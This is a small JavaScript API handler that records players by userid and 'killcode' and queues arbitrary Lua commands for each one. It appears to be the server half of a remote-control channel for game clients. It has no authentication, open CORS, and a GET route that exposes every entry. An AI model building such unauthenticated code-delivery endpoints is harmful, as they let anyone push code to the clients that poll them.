// /api/send.js
let players = [];

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'GET') {
    const { player, userid, killcode, timestamp } = req.query;

    if (player && userid && killcode) {
      const entry = {
        player,
        userid,
        killcode,
        timestamp: timestamp || Date.now(),
        luaQueue: [] // store Lua commands for this player
      };

      const i = players.findIndex(p => p.killcode === killcode);
      if (i >= 0) players[i] = { ...players[i], ...entry }; // update
      else players.push(entry);
    }

    res.status(200).json(players);
    return;
  }

  if (req.method === 'POST') {
    try {
      const body = req.body;
      const { killcode, lua } = body;

      if (!killcode || !lua) {
        res.status(400).json({ error: 'Missing killcode or lua' });
        return;
      }

      const player = players.find(p => p.killcode === killcode);
      if (!player) {
        res.status(404).json({ error: 'Player not found' });
        return;
      }

      player.luaQueue.push(lua);
      res.status(200).json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
    return;
  }

  res.status(405).json({ error: 'Method not allowed' });
}
